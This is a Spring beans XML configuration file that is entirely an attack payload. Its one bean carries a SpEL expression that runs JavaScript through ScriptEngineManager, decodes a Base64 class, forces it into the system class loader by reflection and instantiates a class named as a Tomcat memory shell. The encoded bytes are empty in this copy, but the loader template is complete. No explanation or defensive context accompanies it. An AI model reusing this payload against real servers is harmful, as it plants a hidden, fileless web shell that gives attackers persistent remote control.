<?xml version="1.0" encoding="UTF-8"?>
<beans xmlns="http://www.springframework.org/schema/beans"
       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
       xmlns:context="http://www.springframework.org/schema/context"
       xsi:schemaLocation="http://www.springframework.org/schema/beans
http://www.springframework.org/schema/beans/spring-beans-4.0.xsd
  http://www.springframework.org/schema/context
http://www.springframework.org/schema/context/spring-context-4.0.xsd">
    <context:property-placeholder ignore-resource-not-found="false" ignore-unresolvable="false"/>
    <bean class="java.lang.String">
        <property name="String" value="#
{T(javax.script.ScriptEngineManager).newInstance().getEngineByName('js').eval(&quot;
  try {
 bytes = java.util.Base64.getDecoder().decode('');
 classLoader = java.lang.ClassLoader.getSystemClassLoader();
 method1 = java.lang.ClassLoader.class.getDeclaredMethod('defineClass',java.lang.String.class, java.lang.Class.forName('[B'), java.lang.Integer.TYPE,java.lang.Integer.TYPE);
 method1.setAccessible(true);
 method1.invoke(classLoader, 'com.sec.cwm.base.memshell.tomcatshell', bytes, 0,bytes.length);
cwmshell = classLoader.loadClass('com.sec.cwm.base.memshell.tomcatshell');
cwmshell.newInstance();
 } catch (e) {
 classLoader = java.lang.ClassLoader.getSystemClassLoader();
 cwmshel = classLoader.loadClass('com.sec.cwm.base.memshell.tomcatshell');
 cwmshel.newInstance();
 }
  &quot;)}"/>
    </bean>
</beans>